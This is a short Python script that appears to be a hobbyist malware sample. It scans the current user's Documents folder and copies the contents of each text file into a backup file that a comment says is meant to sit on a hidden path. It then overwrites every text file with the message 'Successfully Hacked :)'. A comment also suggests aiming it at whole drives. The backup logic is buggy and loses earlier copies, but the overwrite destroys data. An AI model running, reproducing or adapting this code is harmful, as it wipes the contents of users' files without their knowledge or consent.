import os
# Another method for destroying all text files in the hard drives=>path = "C:/" or "D:/" or "H:/" or "F:/"
path = "C:/Users/" + os.getenv('username') + "/Documents" or "D:/Users/" + os.getenv('username') + "/Documents"
count = 0
for textfile in os.listdir(path):
    if textfile.endswith('.txt'):
        count+=1
        BackUp_path = "C:/Users/AhmedOssama/Desktop/New folder" #it should be in another hidden path in the prog files but this for debuging
        name_of_BackUP_file = "BackUp22"
        BackUpFile = os.path.join(BackUp_path, name_of_BackUP_file + ".txt")
        with open(BackUpFile, 'w') as Writing_file:
                for i in range(count):
                    with open(path + "/" + textfile, "r") as Txt_to_BackUp_File:
                        txt_To_backUp = str(textfile)+"\n"+Txt_to_BackUp_File.read() + "\n" + "_____________________________________" + "\n"
                        Writing_file.write(txt_To_backUp)
        with open(path + "/" + textfile, 'w') as txt_content:
            txt_content.write("Successfully Hacked :)")